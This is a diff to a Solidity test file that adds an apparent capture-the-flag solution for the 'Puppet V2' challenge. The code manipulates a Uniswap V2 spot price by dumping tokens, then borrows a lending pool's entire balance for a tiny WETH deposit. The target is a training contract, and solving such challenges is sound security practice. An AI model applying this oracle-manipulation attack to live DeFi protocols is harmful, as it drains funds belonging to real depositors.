@@ -98,6 +98,39 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+    // STEP 1: Swap all of player's DVT tokens for WETH on Uniswap V2.
+    // This floods the pair with DVT and drains WETH, crashing DVT's price.
+    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+
+    address[] memory path = new address[](2);
+    path[0] = address(token);
+    path[1] = address(weth);
+
+    uniswapV2Router.swapExactTokensForTokens({
+        amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+        amountOutMin: 0,
+        path: path,
+        to: player,
+        deadline: block.timestamp
+    });
+
+    // STEP 2: Check how much WETH is now required to borrow the entire pool balance.
+    // Price crash means this should now be small.
+    uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+    // STEP 3: Wrap enough ETH into WETH to cover the deposit
+    // (player already holds some WETH from the swap itself — top up the rest with raw ETH)
+    uint256 wethBalance = weth.balanceOf(player);
+    if (wethBalance < depositRequired) {
+        weth.deposit{value: depositRequired - wethBalance}();
+    }
+
+    // STEP 4: Approve the lending pool to pull the required WETH, then borrow everything
+    weth.approve(address(lendingPool), depositRequired);
+    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+    // STEP 5: Send all drained tokens to recovery
+    token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
         
     }
 
